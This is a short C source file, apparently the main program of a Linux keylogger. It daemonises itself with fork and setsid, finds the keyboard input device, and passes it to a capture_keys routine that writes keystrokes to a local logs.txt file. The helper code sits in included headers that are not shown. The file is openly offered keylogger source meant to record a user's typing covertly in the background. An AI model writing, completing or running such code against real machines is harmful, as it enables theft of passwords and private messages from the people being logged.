#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

#include "help.h"
#include "config.h"
#include "keylogger.h"

int main()
{
    FILE *file;
    char *keyboard_event_filename = NULL;

    pid_t pid, sid;
    pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);

    else if (pid > 0)
    {
        printf("Child PID: %d\n", pid);
        exit(EXIT_SUCCESS);
    }

    umask(0);
    sid = setsid();

    file = fopen("./logs.txt", "w");

    keyboard_event_filename = find_keyboard(keyboard_event_filename);

    printf("%s", keyboard_event_filename);

    capture_keys(file, keyboard_event_filename);

    return 0;
}
